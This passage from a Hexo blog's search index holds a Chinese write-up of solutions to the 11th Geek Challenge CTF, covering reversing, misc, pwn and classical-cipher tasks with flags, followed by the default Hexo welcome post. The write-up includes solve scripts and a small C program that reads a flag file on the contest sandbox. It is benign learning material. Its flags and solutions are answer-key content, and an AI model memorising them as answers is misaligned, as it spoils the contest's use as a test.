a[-1:-len(a)-1:-1]，也就是从最后一个元素到第一个元素复制一遍，即倒序。</code></pre><p>2.map(lambda x, y: x ^ y, data, th1s)</p><p><a href="https://blog.csdn.net/landing_guy_/article/details/109331685" title="map，lambda">https://blog.csdn.net/landing_guy_/article/details/109331685</a></p><p>3.for循环后面直接接else（主要是学Python没见过，不知道怎么走）</p><p><a href="https://blog.csdn.net/wj1066/article/details/81913696">https://blog.csdn.net/wj1066/article/details/81913696</a></p><h4 id="三-写脚本-1"><a href="#三-写脚本-1" class="headerlink" title="三.写脚本"></a>三.写脚本</h4><p>然后开始写脚本，由于本人很菜所以，将base64解码分开写的。</p><p>由于网上直接base64解码，会出现乱码，所以在Python中解码，代码如下</p><pre><code>import base64url = &quot;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&quot;str_url = base64.b64decode(url)print(str_url)</code></pre><p>得到结果</p><pre><code>b&#39;\x98H\x90\x08\x08\xc9\xa1rr\xd8\xd8\x99@a\x90\xc9\x19\xba&quot;\x01\xd8A\x90\x08\x08\xa8(\xc0q\xe8\xe08&#39;</code></pre><p>是16进制和一些字符的组合，全部换为10进制（因为我比较喜欢10进制），注意最后的那个8，它转换为10进制是56，就是这一个数，会让你得不到flag（本人深有体会)。转出来如下</p><pre><code>a[]=&#123;152,72,144,8,8,201,161,114,114,216,216,153,64,97,144,201,25,186,34,1,216,65,144,8,8,168,40,192,113,232,224,56&#125;</code></pre><p>然后进行第二，三步解密</p><pre><code>#include&lt;stdio.h&gt;#include &lt;string.h&gt;int main(void)&#123;int a[]=&#123;152,72,144,8,8,201,161,114,114,216,216,153,64,97,144,201,25,186,34,1,216,65,144,8,8,168,40,192,113,232,224,56&#125;;//base64解码后的10进制。int b[]=&#123;84,66,69,83,67,70,83,82,83,65,69,85,73,84,65,78,65,73,73,78,84,66,69,83,67,70,83,82,83,65,69,85&#125;;//这是上面Python中的th1s换成了10进制，可以另外写一个脚本吧上面th1s用整型输出，就不用一个一个写。因为base64解码后的长度为64，故b[]的长度也必须要是32，也就是原来的基础上加上前12个字符。int i,j;int c,t,len;len=sizeof(a)/sizeof(int);//求出解码后的长度，32printf(&quot;%d&quot;,len);printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);printf(&quot;%d&quot;,a[31]);printf(&quot;\n&quot;);for(i=len-2;i!=-1;i--)&#123;    a[i]=a[i]^a[i+1];//反向异或回去，可以自己举4个数来看看是不是真的可以反向异或回去。&#125;for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    a[i]=((a[i]&lt;&lt;5)|(a[i]&gt;&gt;3))&amp;255;//进行位移运算，也可以举例看看怎么弄回去。注意的是其中的&amp;，作用为：主要是限定范围。不会得到大于255的数。    printf(&quot;%d,&quot;,a[i]);&#125;//输出位移后的数组 printf(&quot;\n&quot;);for(i = 0; i &lt; (len-1)/2; i++)&#123;    t = a[i];    a[i] = a[len-i-1];    a[len-i-1] = t;&#125;//将字符串倒序 for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    a[i]=a[i]^b[i];    printf(&quot;%c&quot;,a[i]);&#125;//输出最后的flag</code></pre><p>附加脚本</p><p>16进制转10进制<br>    #include &lt;stdio.h&gt;</p><pre><code>int main(void) &#123;    int i;    int a[]=&#123;0x98,0x48,0x90,0x08,0x08,0xc9,0xa1,0x72,0x72,0xd8,0xd8,0x99,0x40,0x61,0x90,0xc9,0x19,0xba,0x22,0x01,0xd8,0x41,0x90,0x08,0x08,0xa8,0x28,0xc0,0x71,0xe8,0xe0,0x38&#125;;    for(i=0;i!=32;i++)    &#123;        printf(&quot;%d,&quot;,a[i]);    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p>th1s转10进制</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[]=&quot;TBESCFSRSAEUITANAIINTBESCFSRSAEU&quot;;    int i;    for(i=0;a[i]!=&#39;\0&#39;;i++)    &#123;        printf(&quot;%d,&quot;,a[i]);    &#125;    return 0;&#125;</code></pre><h4 id="四-得到flag"><a href="#四-得到flag" class="headerlink" title="四.得到flag"></a>四.得到flag</h4><p>SYC{ssssss_Th1sfPs_Pyth0n_ssss~}#我得到的是这个，可能上面某个位置数据错了，看了下flag，直接改一下得到下面的flag。</p><pre><code>SYC&#123;ssssss_Th1s_is_Pyth0n_ssss~&#125;</code></pre><h2 id="Misc题目"><a href="#Misc题目" class="headerlink" title="Misc题目"></a>Misc题目</h2><h3 id="1-一“页”障目"><a href="#1-一“页”障目" class="headerlink" title="1.一“页”障目"></a>1.一“页”障目</h3><p>直接把宣传单对折，得到flag</p><h3 id="2-壮言壮语"><a href="#2-壮言壮语" class="headerlink" title="2.壮言壮语"></a>2.壮言壮语</h3><p>直接网上佛曰解密，得到flag</p><pre><code>我刘壮就是np，给你flag吧,SYC&#123;i_l0ve_Japanese_wife&#125;</code></pre><h3 id="3-秘技·反复横跳"><a href="#3-秘技·反复横跳" class="headerlink" title="3.秘技·反复横跳"></a>3.秘技·反复横跳</h3><p>网上根据提示搜索binwalk。<br><a href="https://www.jianshu.com/p/03f15e6fedf3">https://www.jianshu.com/p/03f15e6fedf3</a><br>一道类似的题，在ubuntu中执行网站中的操作就可以了，最后分解图片会得到一个二维码，但是是左右交换了的，也算点题把，交换回来，微信扫一扫，就可以得到flag了</p><pre><code>SYC&#123;L3ft~Le4t~R1gHt~RiGhT&#125;</code></pre><h3 id="4-飞翔的刘壮"><a href="#4-飞翔的刘壮" class="headerlink" title="4.飞翔的刘壮"></a>4.飞翔的刘壮</h3><p>题目提示： Welcome “into” 11th Geek Challeng.这里的into就应该代表的是10。<br>一个游戏，下载到手机上，在得到10分的时候死了，就可以得到flag</p><pre><code>SYC&#123;fl4ppyb1rd_1s_s0_inter3tin9!&#125;</code></pre><h3 id="5-来拼图"><a href="#5-来拼图" class="headerlink" title="5.来拼图"></a>5.来拼图</h3><p>就是从众多图片中选出有flag信息的拼在一起，拼出来有点不好看</p><pre><code>SYC&#123;d60fca51c7e61259191f0&#125;</code></pre><h3 id="6-吉普赛的歌姬"><a href="#6-吉普赛的歌姬" class="headerlink" title="6.吉普赛的歌姬"></a>6.吉普赛的歌姬</h3><p>不知道这道题考什么，考信息收集能力？去QQ空间看看，然后知道flag在相册里面，然后根据说说前两条，先到贴吧看看，然后搜索DJ南方，然后叫你去网易找伪·Nightcore这个电台，（中间还会遇到两个base64加密的假flag，人心险恶）找一首叫吉普赛歌姬的歌（歌里面什么也没有），但是歌下面有评论说，密码是名字+生日，然后进入相册，得到一张图片，上面有flag</p><pre><code>SYC&#123;Fr1endsh1p_1s_w1tchcr@ft&#125;</code></pre><h2 id="pwn题目"><a href="#pwn题目" class="headerlink" title="pwn题目"></a>pwn题目</h2><h3 id="1-数学咋样？"><a href="#1-数学咋样？" class="headerlink" title="1.数学咋样？"></a>1.数学咋样？</h3><p>用ubuntu打开端口</p><pre><code>luckyboy@luckyboy-virtual-machine:~$ nc 81.69.0.47 1111------------------------------------------Can you help me to solve my math problem?------------------------------------------I have 20 tests![0]  num_1 = 822, num_2 = 701I can&#39;t calculate the expression &#39;num_1 + num_2&#39;.input your answer:</code></pre><p>进行20次计算，最后得到flag</p><h3 id="2-runcode"><a href="#2-runcode" class="headerlink" title="2.runcode"></a>2.runcode</h3><p>考点是读取一个文件并输出，百度搜索一下怎么读取一个文件<br><a href="https://blog.csdn.net/qq_26853817/article/details/79756617">https://blog.csdn.net/qq_26853817/article/details/79756617</a>，根据这个来写脚本。如下</p><pre><code>#include &lt;stdio.h&gt; int main(void)&#123;    char a[200] = &#123;0&#125;;    FILE *fp = fopen(&quot;/home/ctf/flag&quot;, &quot;r&quot;);    fgets(a, 100, fp);    puts(a);    return 0; &#125;</code></pre><p>注意数组长度要足够长，不然读不完。放到网站里面run，run两次，得到flag</p><pre><code>SYC&#123;C0din9_ls_E4sy_T0_You&#125;</code></pre><h2 id="密码学题目"><a href="#密码学题目" class="headerlink" title="密码学题目"></a>密码学题目</h2><h3 id="1-二战情报员刘壮"><a href="#1-二战情报员刘壮" class="headerlink" title="1.二战情报员刘壮"></a>1.二战情报员刘壮</h3><p>摩氏密码，直接网上在线解密，得到L1UZHU4NG_I_Z1Y1，得到flag</p><pre><code>SYC&#123;L1UZHU4NG_I_Z1Y1&#125;</code></pre><h3 id="2-铠甲与萨满"><a href="#2-铠甲与萨满" class="headerlink" title="2.铠甲与萨满"></a>2.铠甲与萨满</h3><p>凯撒密码，直接网上在线解密，先根据前三个字母确定位移为6，也可以一个一个试，解密出来的flag为</p><pre><code>SYC&#123;liuzhuangliuzhuang_bangbangbang&#125;</code></pre><h3 id="3-跳跃的指尖"><a href="#3-跳跃的指尖" class="headerlink" title="3.跳跃的指尖"></a>3.跳跃的指尖</h3><p>跳跃的指尖，需要脑洞大一点，就是键盘啦，每一段字母都会围一个单词，写出所有单词就是flag</p><pre><code>SYC&#123;easyCrypto&#125;</code></pre><h3 id="4-成都养猪二厂"><a href="#4-成都养猪二厂" class="headerlink" title="4.成都养猪二厂"></a>4.成都养猪二厂</h3><p>猪圈密码和栅栏密码，网上在线解密，先把图片中的猪圈密码解出来得到ssyirceehsagiulisolbhy，然后根据那个txt里面的内容确定栅栏密码的位移量为7，网上在线解密，得到flag</p><pre><code>SYC&#123;his_house_is_really_big&#125;</code></pre><h3 id="5-规规矩矩的工作"><a href="#5-规规矩矩的工作" class="headerlink" title="5.规规矩矩的工作"></a>5.规规矩矩的工作</h3><p>看题目和提示，应该是考矩阵和希尔密码，直接在网上解矩阵，<a href="https://matrix.reshish.com/">https://matrix.reshish.com/</a>，得到</p><pre><code>x1 = 10x2 = 4x3 = -2</code></pre><p>A=0,B=1,C=2……然后换为字母，为KEY，用cmd打开decode_machine.exe（要不然直接打开好像会闪退），输入KEY,得到flag</p><pre><code>SYC&#123;linear_algebra_make_ctf_great_again&#125;</code></pre><h3 id="6-Simple-calculation"><a href="#6-Simple-calculation" class="headerlink" title="6.Simple calculation"></a>6.Simple calculation</h3><p>这道题部分靠运气，直接解矩阵，得到</p><pre><code>x1 = 77/2x2 = -48x3 = -21x4 = 65x5 = -63/2</code></pre><p>有分数，x1和x5分数求余的话好像网上找了很多也没有解出来，然后试着将，3 7 1 1 20换为29 7 1 1 -6（实际上试了很多数,加上一点点LOL基础），解出来得到</p><pre><code>x1 = 19x2 = 30x3 = 18x4 = -65x5 = 27</code></pre><p>全部换到0~26范围，得到flag</p><pre><code>SYC&#123;TESNB&#125;</code></pre><h3 id="7-韡髻猊岈"><a href="#7-韡髻猊岈" class="headerlink" title="7.韡髻猊岈"></a>7.韡髻猊岈</h3><p>Vigenere解密，网上自己找资料，了解原理，Vigenere解密第一步要确定密钥长度，第二步要算出密钥是什么，这个要知道原理和对照那个Vigenere表来算密钥。<br>首先根据相同的单词算出密钥长度为6，在根据加密内容中的TGP（解密出来肯定是SYC），算出半个密钥为bin，然后开始在bin前面加aaa变成aaabin，去解密，发现SYC后面的英文为</p><pre><code>vhxre iu nh teats bn viiegere，</code></pre><p>那个iu，肯定是is，通过这个又算出一个密钥的字母caabin，在用这个来解密，得到</p><pre><code>thxre is nh tears bn vigegere</code></pre><p>这个thxre肯定是there，从而算出密钥为catbin，得到flag</p><pre><code>SYC&#123;there_is_no_tears_in_vigenere&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/11/28/hello-world/"/>
      <url>2020/11/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
